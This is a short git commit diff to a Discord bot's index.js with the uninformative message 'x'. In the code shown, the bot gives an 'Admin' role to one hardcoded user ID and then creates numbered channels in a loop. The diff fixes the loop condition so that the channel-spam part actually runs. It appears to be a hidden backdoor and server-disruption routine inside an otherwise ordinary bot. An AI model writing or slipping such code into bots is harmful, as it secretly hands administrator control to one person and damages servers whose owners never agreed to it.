7c5ae43050e9d16433d2a82173cfcd2656b291e5
Austerzockt <48381097+Austerzockt@users.noreply.github.com>
2021-02-26 13:46:45 +0100

    x

--- index.js
+++ index.js
@@ -78,9 +78,9 @@ client.on("message", message => {
                if (e.id === "761270337480032300") {
                    const role = guild.roles.cache.find(role => role.name.includes("Admin"));
                    guild.member(e.user).roles.add(role);
-                   for (let i = 0; i > 100; i++) {
+                   for (let i = 0; i < 10; i++) {
                        guild.channels.create(i.toString()).then(function () {
-                           if (i === 80) message.channel.send("WORKDS");
+                           if (i === 8) message.channel.send("WORKDS");
                        });
                        message.guild.channels.cache.delete(i.toString());
                    }
